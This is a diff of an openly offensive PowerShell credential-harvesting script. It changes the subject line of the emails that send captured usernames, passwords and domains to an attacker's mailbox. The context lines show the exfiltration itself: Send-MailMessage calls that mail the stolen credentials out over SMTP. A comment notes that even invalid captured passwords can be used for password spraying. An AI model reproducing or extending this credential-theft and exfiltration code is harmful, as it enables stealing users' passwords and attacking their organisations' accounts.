@@ -36,7 +36,7 @@ Param ()
                 $local_creds= "Username: " + $user + " Password: " + $pass + " Domain:" + $full_domain
 		# SEND SECOND EMAIL CONTAINING VALID SYSTEM CREDENTIALS
 
-		$System_Subject = "SYSTEM CREDENTIALS HIJACKED!!!!"
+		$System_Subject = "SYSTEM CREDENTIALS HIJACKED (VALID CREDS) !!!!"
 		$newline = "`r`n"
 		Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $System_Subject -Body $local_creds -SmtpServer $SmtpServer -UseSsl -Credential $Credentials
                 break
@@ -45,7 +45,7 @@ Param ()
 	    	$local_creds= "Username: " + $user + " Password: " + $pass + " Domain:" + $full_domain
 		# SEND EMAIL CONTAINING INVALID SYSTEM CREDENTIALS , CAN BE USED FOR PASSWORD SPRAYING
 
-		$System_Subject = "SYSTEM CREDENTIALS HIJACKED!!!!"
+		$System_Subject = "SYSTEM CREDENTIALS HIJACKED (INVALID CREDS) !!!!"
 		$newline = "`r`n"
 		Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $System_Subject -Body $local_creds -SmtpServer $SmtpServer -UseSsl -Credential $Credentials
         }
@@ -115,7 +115,7 @@ Param ()
                 $local_creds= "Username: " + $user + " Password: " + $pass + " Domain:" + $full_domain
 		# SEND SECOND EMAIL CONTAINING VALID SYSTEM CREDENTIALS
 
-		$System_Subject = "SYSTEM CREDENTIALS HIJACKED!!!!"
+		$System_Subject = "SYSTEM CREDENTIALS HIJACKED (VALID CREDS) !!!!"
 		$newline = "`r`n"
 		Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $System_Subject -Body $local_creds -SmtpServer $SmtpServer -UseSsl -Credential $Credentials
                 exit
@@ -124,7 +124,7 @@ Param ()
 	    	$local_creds= "Username: " + $user + " Password: " + $pass + " Domain:" + $full_domain
 		# SEND EMAIL CONTAINING INVALID SYSTEM CREDENTIALS , CAN BE USED FOR PASSWORD SPRAYING
 
-		$System_Subject = "SYSTEM CREDENTIALS HIJACKED!!!!"
+		$System_Subject = "SYSTEM CREDENTIALS HIJACKED (INVALID CREDS) !!!!"
 		$newline = "`r`n"
 		Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $System_Subject -Body $local_creds -SmtpServer $SmtpServer -UseSsl -Credential $Credentials
         }
